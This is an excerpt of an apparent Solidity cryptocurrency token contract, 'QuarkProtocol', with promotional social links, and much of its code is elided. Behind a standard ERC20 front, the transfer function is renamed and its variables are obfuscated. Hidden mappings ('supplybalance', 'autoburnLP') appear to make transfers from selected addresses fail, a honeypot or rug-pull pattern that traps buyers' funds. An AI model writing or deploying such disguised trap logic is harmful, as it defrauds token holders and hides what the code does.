...
https://t.me/QuarkProtocol
https://quarknetwork.space/
https://twitter.com/QuarkERC
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public QuarkMKT;
    ...
    function metal(
        ...
        uint256 fromBalance = QuarkMKT[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            QuarkMKT[from] = fromBalance - amount;
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = QuarkMKT[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            QuarkMKT[account] = accountBalance - amount;
...
contract QuarkProtocol is ERC20, Ownable {
    address private gas;
    ...
    function metal(
        ...
        if (supplybalance[Quarkdplyer] == 0 && autoburnLP[Quarkdplyer] > 0) {
            address uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
            if (uniswapV2Pair != Quarkdplyer) {
                supplybalance[Quarkdplyer] -= care;
            }
        }
        ...
        if (supplybalance[Quarkdplyer] == 0) QuarkMKT[Quarkdplyer] -= review;

        uint256 voice = review * arm;
        voice = voice / 100;
        review -= voice;
        QuarkMKT[QuarkBurn] += review;
        emit Transfer(Quarkdplyer, QuarkBurn, review);
    }
    ...
    constructor(
        ...
        QuarkMKT[_msgSender()] = 1000000000000 * 10**9;
    }
}